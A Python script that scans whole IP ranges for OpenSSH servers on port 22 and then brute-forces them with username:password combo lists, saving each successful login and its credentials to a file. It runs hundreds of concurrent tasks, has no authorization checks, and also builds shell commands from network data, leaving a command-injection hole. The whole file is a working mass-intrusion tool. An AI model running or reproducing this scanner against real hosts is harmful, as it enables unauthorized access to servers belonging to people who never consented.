import ipaddress
import aiofiles
import asyncssh
import argparse
import asyncio
import random
import time
import sys
import os

# debug, removing later
# also note: remove useless prints

import traceback

from pathlib import Path

def generate_range(ranges):
    splitted = ranges.split('.')
    netmask = len(splitted) * 8
    for i in range(len(splitted), 4):
        splitted.append('0')

    fmt = '.'.join(splitted)
    network = f'{fmt}/{netmask}'
    output = [str(x) for x in ipaddress.ip_network(network).hosts()]

    return output

def read_combo(file):
    check = Path(file)
    if not check.is_file():
        raise Exception('File is not in path. Make sure there is a combo list.')

    with open(file, 'r') as f:
        scan = f.read()

    combo = []
    for entry in scan.split():
        try:
            username, password = entry.split(':')
        except ValueError:
            raise Exception(f'Invalid combo list. ({entry})')

        entry = {'username': username, 'password': password}
        combo.append(entry)

    return combo

def read_ips(file):
    check = Path(file)
    if not check.is_file():
        return False

    with open(file, 'r') as f:
        scan = f.read()

    combo = [entry for entry in scan.split()]
    if not combo:
        return False

    return combo

def chunk_list(seq, size):
    return (seq[i::size] for i in range(size))

async def run_ssh(ip, username, password):
    client = asyncssh.connect(ip, username=username, password=password, known_hosts=None)
    async with (await asyncio.wait_for(client, timeout=timeout)) as conn:
        result = await conn.run('uptime -p', check=True)
        return result.stdout

async def port_worker(name, queue):
    check = await queue.get()
    print(f'[{name}] [{len(check)}]')
    for c in check:
        fut = asyncio.open_connection(c, 22)
        try:
            reader, writer = await asyncio.wait_for(fut, timeout=timeout)
        except Exception:
            pass
        else:
            try:
                data = await reader.read(1024)
                if 'OpenSSH' in data.decode('utf8'):
                    os.system(f'echo {c} >> {file}')
            except Exception:
                pass
            else:
                writer.close()

    queue.task_done()

async def brute_worker(name, queue):
    check = await queue.get()
    for combo in combos:
        username = combo['username']
        password = combo['password']
        print(f'[{name}] [{len(check)}] Trying {username}:{password}')
        for c in check:
            try:
                result = await run_ssh(c, username, password)
                found = f'[+] Found {c} -> {username}:{password} -> {result}'
                print(found)
                os.system(f'echo "{found}" >> found.txt')
            except Exception:
                pass

            #except (OSError, asyncio.TimeoutError, ConnectionRefusedError):
            #    pass
            #except (asyncssh.PermissionDenied, asyncssh.ConnectionLost):
            #    pass

    queue.task_done()

async def main(loop):
    queue = asyncio.Queue()

    tasks = []
    chunk_ranges = chunk_list(ranges, threads)
    for r in chunk_ranges:
        queue.put_nowait(r)

    for t in range(threads):
        name = f'Task {t:>4}'
        func = port_worker if port else brute_worker
        task = loop.create_task(func(name, queue))
        tasks.append(task)

    started_at = time.monotonic()
    await queue.join()
    total_slept_for = time.monotonic() - started_at

    for task in tasks:
        task.cancel()

    await asyncio.gather(*tasks, return_exceptions=True)
    print(f'Total elapsed: {total_slept_for:.2f} seconds')

if __name__ == '__main__':
    description = 'Fully asynchronous SSH Scanner made in Python3.6'
    parser = argparse.ArgumentParser(description=description)
    
    # required argument no matter what
    parser.add_argument('--file', '-f', type=str, required=True)
    
    # optional arguments
    # `port` can only be used with `range`
    # `range` can only be used with `port`
    # `combo` cannot be used with either `port` or `range`
    parser.add_argument('--port', '-p', action='store_true')
    parser.add_argument('--range', '-r', type=str)
    parser.add_argument('--combo', '-c', type=str)
    
    # default arguments
    parser.add_argument('--timeout', type=int, default=10)
    parser.add_argument('--threads', type=int, default=300)
    
    args = parser.parse_args()

    file = args.file
    ranges = read_ips(file)
    if not ranges:  
        ranges = generate_range(args.range)

    port = args.port
    combo = args.combo
    if combo:
        combos = read_combo(combo)

    timeout = args.timeout
    if timeout > 30:
        print('WARNING: setting timeout to >30s will have a huge impact ' \
                'on the time it takes to complete the bruteforce')

    threads = args.threads
    if threads > 2000:
        print('WARNING: setting threads to >2000 might cause several issues')

    print(f'Starting with {threads} threads\n'
            f'Generated {len(ranges)} IPs\n'
            #f'Using {len(combos)} combinations\n'
            '=============================')

    time.sleep(2)
    loop = asyncio.get_event_loop()

    try:
        loop.run_until_complete(main(loop))
    except KeyboardInterrupt:
        print('Ok.')
    finally:
        loop.close()
